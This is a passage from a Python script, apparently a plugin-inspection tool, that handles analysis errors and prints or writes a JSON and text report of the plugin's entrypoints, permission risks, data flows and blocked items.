        result = analyze(args.path, out_dir)
    except ReproError as exc:
        payload = {"ok": False, "blocked_at": exc.blocked_at, "reason": exc.reason, "path": args.path}
        print(json.dumps(payload, ensure_ascii=False))
        if not args.json:
            print("[FAIL] %s: %s" % (exc.blocked_at, exc.reason), file=sys.stderr)
        return 2
    except Exception as exc:  # noqa: BLE001
        payload = {"ok": False, "blocked_at": "analyze", "reason": str(exc)[:200], "path": args.path}
        print(json.dumps(payload, ensure_ascii=False))
        if not args.json:
            print("[FAIL] %s" % exc, file=sys.stderr)
        return 2
    summary = os.path.join(out_dir, "plugin-repro.json")
    with open(summary, "w", encoding="utf-8") as fh:
        json.dump(result, fh, ensure_ascii=False, indent=2)
    if args.json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
        print("wrote: %s" % summary, file=sys.stderr)
    else:
        print("== plugin repro ==")
        print("container : %s  files=%s extracted=%s" % (result["container"], result["file_count"], result["extracted_count"]))
        print("unpacked  : %s" % result["unpacked"])
        print("entries   :")
        for e in result["entrypoints"][:20]:
            print("  - %-24s %s exists=%s" % (e.get("kind"), e.get("path") or e.get("command") or e.get("value"), e.get("exists")))
        print("permissions:")
        for p in result["permissions"]:
            print("  - %-18s risk=%-7s status=%s evidence=%d" % (p["name"], p["risk"], p["status"], len(p["evidence"])))
        print("data_flow : %s" % ", ".join(f["kind"] for f in result["data_flow"]))
        print("minimal   : %s" % json.dumps(result["minimal_unit"], ensure_ascii=False)[:400])
        print("blocked   : %s" % (", ".join(result["blocked"]) or "(none)"))
        print("wrote     : %s" % summary)
    return 0


if __name__ == "__main__":
    sys.exit(main())
